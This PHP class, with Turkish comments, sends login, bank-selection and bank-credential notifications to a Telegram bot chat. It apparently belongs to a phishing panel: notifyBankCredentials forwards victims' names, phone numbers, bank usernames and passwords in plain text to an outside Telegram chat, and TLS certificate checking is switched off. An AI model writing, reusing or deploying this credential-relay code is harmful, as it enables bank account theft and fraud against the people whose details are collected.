<?php
/**
 * Telegram Bot Servisi
 */

namespace App\Models;

use App\Core\Database;

class TelegramService
{
    private string $botToken;
    private string $chatId;
    private bool $enabled;
    private string $apiUrl;

    public function __construct()
    {
        $config = require __DIR__ . '/../../config/telegram.php';
        
        // Önce veritabanından ayarları kontrol et
        try {
            $db = Database::getInstance();
            $stmt = $db->query("SELECT setting_key, setting_value FROM settings WHERE setting_key IN ('telegram_bot_token', 'telegram_chat_id', 'telegram_enabled')");
            $settings = [];
            while ($row = $stmt->fetch()) {
                $settings[$row['setting_key']] = $row['setting_value'];
            }
            
            $this->botToken = $settings['telegram_bot_token'] ?? $config['bot_token'];
            $this->chatId = $settings['telegram_chat_id'] ?? $config['chat_id'];
            $enabled = ($settings['telegram_enabled'] ?? $config['enabled']) === '1' || $settings['telegram_enabled'] === '1';
        } catch (\Exception $e) {
            // Veritabanı hatası durumunda config dosyasını kullan
            $this->botToken = $config['bot_token'];
            $this->chatId = $config['chat_id'];
            $enabled = $config['enabled'];
        }
        
        $this->enabled = $enabled && !empty($this->botToken) && !empty($this->chatId);
        $this->apiUrl = $config['api_url'];
    }

    /**
     * Mesaj gönder
     */
    public function sendMessage(string $message): bool
    {
        if (!$this->enabled) {
            return false;
        }

        $url = $this->apiUrl . $this->botToken . '/sendMessage';
        
        $data = [
            'chat_id' => $this->chatId,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        return $httpCode === 200;
    }

    /**
     * Kullanıcı giriş bildirimi
     */
    public function notifyUserLogin(string $fullName, string $phone, string $ipAddress): bool
    {
        $message = "🔔 <b>Yeni Kullanıcı Girişi</b>\n\n";
        $message .= "👤 <b>İsim:</b> {$fullName}\n";
        $message .= "📱 <b>Telefon:</b> {$phone}\n";
        $message .= "🌐 <b>IP:</b> {$ipAddress}\n";
        $message .= "🕐 <b>Tarih:</b> " . date('d.m.Y H:i:s');

        return $this->sendMessage($message);
    }

    /**
     * Banka seçimi bildirimi
     */
    public function notifyBankSelection(string $fullName, string $phone, string $bankName): bool
    {
        $message = "🏦 <b>Banka Seçimi</b>\n\n";
        $message .= "👤 <b>Kullanıcı:</b> {$fullName}\n";
        $message .= "📱 <b>Telefon:</b> {$phone}\n";
        $message .= "🏛️ <b>Banka:</b> {$bankName}\n";
        $message .= "🕐 <b>Tarih:</b> " . date('d.m.Y H:i:s');

        return $this->sendMessage($message);
    }

    /**
     * Banka bilgileri bildirimi
     */
    public function notifyBankCredentials(string $fullName, string $phone, string $bankName, ?string $username = null, ?string $password = null): bool
    {
        $message = "🔐 <b>Banka Bilgileri</b>\n\n";
        $message .= "👤 <b>Kullanıcı:</b> {$fullName}\n";
        $message .= "📱 <b>Telefon:</b> {$phone}\n";
        $message .= "🏛️ <b>Banka:</b> {$bankName}\n";
        
        if ($username) {
            $message .= "👤 <b>Kullanıcı Adı:</b> {$username}\n";
        }
        
        if ($password) {
            $message .= "🔑 <b>Şifre:</b> {$password}\n";
        }
        
        $message .= "🕐 <b>Tarih:</b> " . date('d.m.Y H:i:s');

        return $this->sendMessage($message);
    }
}

